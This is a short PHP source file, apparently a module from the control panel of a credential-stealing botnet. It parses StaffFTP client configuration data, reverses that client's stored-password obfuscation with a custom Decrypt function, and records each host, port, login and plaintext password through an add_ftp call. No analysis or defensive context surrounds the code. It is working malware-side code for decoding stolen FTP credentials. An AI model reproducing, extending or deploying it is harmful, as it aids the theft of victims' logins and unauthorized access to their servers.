<?php
//ok
class Module_staffftp extends Module_
{
    private function Decrypt($Password)
    {
        $k = 1;
        $Result = '';
        for ($i = 0; $i < idiv(strlen($Password), 2); $i++, $k++)
            $Result .= chr((ord($Password[$i*2]) >> 1) + ord($Password[$i*2+1]) - $k);
			
        return $Result;
    }

    private function ProcessStaffFTP($Source)
    {
        $INI_ = parse_ini($Source);
		if($INI_ == NULL)
			return;
		
        foreach ($INI_ as $Section)
        {
            if (!is_array($Section))
                continue;
			
            $Host = Assign_($Section["host"]);
            $User = Assign_($Section["login"]);
            $Pass = $this->Decrypt($Section["password"]);
            $Port = Assign_($Section["port"]);

            $this->add_ftp($this->append_port($Host, $Port), $User, $Pass);
        }
		
		$INI_ = NULL;
    }

    public function process_module($Data, $Version)
    {
        switch ($Version)
        {
        case 0:
            $this->ProcessStaffFTP($Data);
            break;
        default:
            return FALSE;
        }

        return TRUE;
    }
}

